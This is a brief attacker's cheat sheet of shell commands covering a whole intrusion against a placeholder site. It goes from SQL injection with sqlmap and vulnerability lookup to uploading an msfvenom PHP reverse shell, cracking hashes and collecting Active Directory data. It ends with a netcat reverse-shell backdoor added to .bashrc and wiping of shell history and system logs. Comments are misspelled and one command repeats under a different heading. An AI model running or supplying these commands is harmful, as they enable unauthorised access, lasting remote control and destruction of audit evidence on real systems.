# sql attack 
sqlmap -u "https://example.com/login.php?user=admin" --batch --dbs

# idenfiy known explit vulnerabilites 
nikto -h example.com | grep "OSVDB" | cut -d " " -f2 | xargs -I{} searchsploit {}

#exploit webshell 
msfvenom -p php/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw > shell.php

# exploit webshell
curl -X POST -F "file=@shell.php" https://example.com/upload

# crack hashes
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force

## AD lateral movement
bloodhound-python -d example.com -u user -p password -c All -o bloodhound.json

# enumerate smb 
bloodhound-python -d example.com -u user -p password -c All -o bloodhound.json

# data xfil 
find / -type f -iname "*.txt" -o -iname "*.log" -o -iname "*.conf" 2>/dev/null

# backdoor 
echo "nc -e /bin/bash YOUR_IP 4444" >> ~/.bashrc

# cleanu 
history -c && rm -rf ~/.bash_history
echo "" > /var/log/auth.log && echo "" > /var/log/syslog
